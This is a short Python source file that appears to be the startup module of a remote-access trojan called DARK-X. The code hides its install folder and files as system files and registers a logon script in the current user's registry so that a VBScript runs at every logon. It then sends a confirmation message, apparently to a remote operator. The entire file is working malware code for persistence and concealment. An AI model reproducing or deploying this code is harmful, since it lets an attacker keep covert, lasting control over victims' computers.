import os,sys
from _winreg import *
class Startup():
	def __init__(self, _):
		self._ = _
		self.Main()

	def Main(self):
		os.system("cmd.exe /c attrib +s +h \"C:\Users\Public\DARK-X\" & attrib +s +h -r \"C:\Users\Public\DARK-X\*.*\" /s /d")
		dirname = os.path.dirname(os.path.abspath(sys.argv[0]))
		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
		CloseKey(root_key)
		self._.Send_Message("%E2%9C%94%EF%B8%8F Startup Setted.")
